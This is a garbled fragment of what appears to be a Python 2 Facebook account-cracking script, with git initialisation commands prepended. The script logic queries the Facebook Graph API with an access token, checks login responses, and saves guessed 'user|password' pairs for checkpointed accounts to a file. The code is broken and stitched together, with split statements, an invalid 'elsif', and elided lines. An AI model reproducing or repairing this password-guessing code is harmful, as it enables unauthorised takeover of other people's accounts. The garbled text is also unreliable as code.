echo "# FaizanKinG" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/FaizankhanF/FaizanKinG.git
git push -u origin mainimport os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
...
\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/faizankhan/faiz
\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/faizankhan
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													elsif 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\xcek.write(user+"|"+pass6+"\n")
															cek.close()
								...
								a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	...
																	cek = open("out/checkpoint.txt", "cek.write(user+"|"+pass7+"\n")
																	cek.close()
